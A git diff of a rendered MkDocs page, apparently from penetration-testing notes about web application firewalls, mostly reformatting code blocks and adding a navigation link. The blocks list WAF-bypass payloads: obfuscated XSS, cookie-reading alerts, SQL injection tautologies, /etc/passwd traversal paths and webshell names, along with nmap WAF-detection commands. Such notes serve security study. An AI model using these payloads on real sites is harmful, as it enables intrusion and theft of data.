@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17249,69 +17272,120 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><a href="../regex/">See notes on regex</a>.</p>
 <p>The best solution for protecting a webapp is whitelisting. But blacklisting methods are commonly found in deployments. Blacklisting includes a collection of well-known attacks. There are WAF bypasses.</p>
 <h2 id="waf-bypasses">WAF bypasses</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>################
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a># XSS: alert(&#39;xss&#39;) and alert(1)
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>################
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>prompt(&#39;xss&#39;)
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>prompt(8)
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>confirm(&#39;xss&#39;)
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>confirm(8)
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>alert(/xss/.source)
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>window[/alert/.source](8)
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>################
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a># XSS: alert(document.cookie)
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>################
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>with(document)alert(cookie)
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>alert(document[&#39;cookie&#39;])
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>alert(document[/cookie/.source])
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>alert(document[(/coo/.source+/kie/.source])
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>################
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a># XSS: &lt;img src=x onerror=alert(1);&gt;
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>################
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>&lt;svg/onload=alert(1)&gt;
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>&lt;video src=x onerror=alert(1);&gt;
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>&lt;audio src=x onerror=alert(1);&gt;
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>################
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a># XSS: javascript:alert(document.cookie)
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>################
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>################
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a># Blind SQL injection: &#39;or 1=1
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>################
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>&#39; or 6=6
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>&#39; or 0x47=0x47
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>or char(32)=&#39;&#39;
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>or 6 is not null
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>################
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a># Blind SQL injection: &#39;or 1=1
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>################
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>UNION ALL SELECT
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>################
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>#  Directory Traversals: /etc/passwd
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>################
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>/too/../etc/far/../passwd
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>/etc//passwd
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>/etc/ignore/../passwd
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>/etc/passwd.......
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>################
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>#  Webshells: c99.php, r57.php, shell.aspx, cmd.jsp, CmdAsp.asp
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>################
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>augh.php
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span>
+<span class="normal"><a href="#__codelineno-0-23">23</a></span>
+<span class="normal"><a href="#__codelineno-0-24">24</a></span>
+<span class="normal"><a href="#__codelineno-0-25">25</a></span>
+<span class="normal"><a href="#__codelineno-0-26">26</a></span>
+<span class="normal"><a href="#__codelineno-0-27">27</a></span>
+<span class="normal"><a href="#__codelineno-0-28">28</a></span>
+<span class="normal"><a href="#__codelineno-0-29">29</a></span>
+<span class="normal"><a href="#__codelineno-0-30">30</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>################
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a># XSS: alert(&#39;xss&#39;) and alert(1)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>################
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>prompt(&#39;xss&#39;)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>prompt(8)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>confirm(&#39;xss&#39;)
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>confirm(8)
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>alert(/xss/.source)
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>window[/alert/.source](8)
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>################
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a># XSS: alert(document.cookie)
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a>################
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a>with(document)alert(cookie)
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>alert(document[&#39;cookie&#39;])
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a>alert(document[/cookie/.source])
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a>alert(document[(/coo/.source+/kie/.source])
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a>################
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a># XSS: &lt;img src=x onerror=alert(1);&gt;
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a>################
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a>&lt;svg/onload=alert(1)&gt;
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23"></a>&lt;video src=x onerror=alert(1);&gt;
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24"></a>&lt;audio src=x onerror=alert(1);&gt;
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25"></a>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26"></a>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27"></a>################
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28"></a># XSS: javascript:alert(document.cookie)
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29"></a>################
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30"></a>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>################
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a># Blind SQL injection: &#39;or 1=1
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>################
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>&#39; or 6=6
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>&#39; or 0x47=0x47
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>or char(32)=&#39;&#39;
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>or 6 is not null
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>################
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a># Blind SQL injection: &#39;or 1=1
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>################
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a>UNION ALL SELECT
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span>
+<span class="normal"><a href="#__codelineno-2-4">4</a></span>
+<span class="normal"><a href="#__codelineno-2-5">5</a></span>
+<span class="normal"><a href="#__codelineno-2-6">6</a></span>
+<span class="normal"><a href="#__codelineno-2-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>################
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>#  Directory Traversals: /etc/passwd
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>################
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>/too/../etc/far/../passwd
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>/etc//passwd
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>/etc/ignore/../passwd
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>/etc/passwd.......
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>################
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>#  Webshells: c99.php, r57.php, shell.aspx, cmd.jsp, CmdAsp.asp
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>################
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>augh.php
+</span></code></pre></div></td></tr></table></div>
 <h3 id="fingerprinting-a-waf">Fingerprinting a WAF</h3>
 <p>Tools: <a href="../wafw00f/">wafw00f</a> and <a href="../nmap/">nmap</a> script:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-script<span class="w"> </span>http-waf-detect<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-script<span class="w"> </span>http-waf-fingerprint<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-script<span class="w"> </span>http-waf-detect<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-script<span class="w"> </span>http-waf-fingerprint<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>Detecting a WAF manually</strong></p>
 <p><strong>1.</strong> <em>Cookies</em>: Via cookie values.</p>
 <table>
@@ -17345,17 +17419,20 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Browser addons such as <a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/">NoScript</a> is a whitelist-based security tool that basically disables all the executable web content (javascript, java, flash, silverlight...) and lets the user choose which sites are "trusted". Nice feature: anti-XSS protection.</p>
 <h3 id="internet-explorer">Internet explorer</h3>
 <p>Internet Explorer, XSS Filter, which modifies reflected values in the following way:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># This payload
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;svg/onload=alert(1)&gt;
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a># is transformed to
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&lt;svg/#nload=alert(1)&gt;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a># This payload
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>&lt;svg/onload=alert(1)&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a># is transformed to
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>&lt;svg/#nload=alert(1)&gt;
+</span></code></pre></div></td></tr></table></div>
 <p>XSS Filter is enabled by default in the Internet but websites that want to opt-out of this protection can use the following response header:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>X-XSS-Protection:0
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>X-XSS-Protection:0
+</span></code></pre></div></td></tr></table></div>
 <p>Later on the Internet Explorer team introduced a new directive in the X-XSS-Protection header:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>X-XSS-Protection:1; mode=block
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>X-XSS-Protection:1; mode=block
+</span></code></pre></div></td></tr></table></div>
 <p>With this directive, if a potential XSS attack is detected, the browser, rather than attempting to sanitize the page, will render a simple #. This directive has been implemented in other browsers.</p>
 <h3 id="chrome">Chrome</h3>
 <p>Chrome has XSS Auditor. XSS Auditor is between the HTML Parser and the JS engine.</p>
@@ -17436,7 +17513,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
